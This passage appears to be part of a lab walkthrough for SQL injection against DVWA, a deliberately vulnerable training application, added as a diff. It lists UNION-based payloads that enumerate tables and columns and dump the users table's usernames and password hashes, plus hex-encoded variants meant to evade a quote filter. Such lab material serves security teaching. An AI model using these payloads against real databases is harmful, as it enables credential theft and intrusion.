@@ -1,0 +1,61 @@
+In Low and Medium security levels, you can use standard string literals.
+
+Step A: Extract Table Names
+
+This finds all tables inside the dvwa database.
+
+sql
+
+1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -
+
+
+Step B: Extract Column Names
+
+This finds the column names inside the target users table.
+
+sql
+
+1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'-- -
+
+
+
+
+Step C: Dump the Data
+
+Once you have the columns (user and password), extract the credentials.
+
+sql
+
+1' UNION SELECT user, password FROM dvwa.users-- -
+
+
+
+
+2. High Security (Bypassing Quotes Filter)
+
+In High security, DVWA might sanitize or block single quotes (') to disrupt your query. You can bypass this restriction entirely by converting the database and table names into Hexadecimal values.
+
+
+
+
+
+dvwa in Hex is 0x64767761
+
+
+
+users in Hex is 0x7573657273
+
+Step A: Extract Tables (Hex Bypass)
+
+sql
+
+1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=0x64767761-- -
+
+
+Step B: Extract Columns (Hex Bypass)
+
+sql
+
+1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema=0x64767761 AND table_name=0x7573657273-- -
+
+
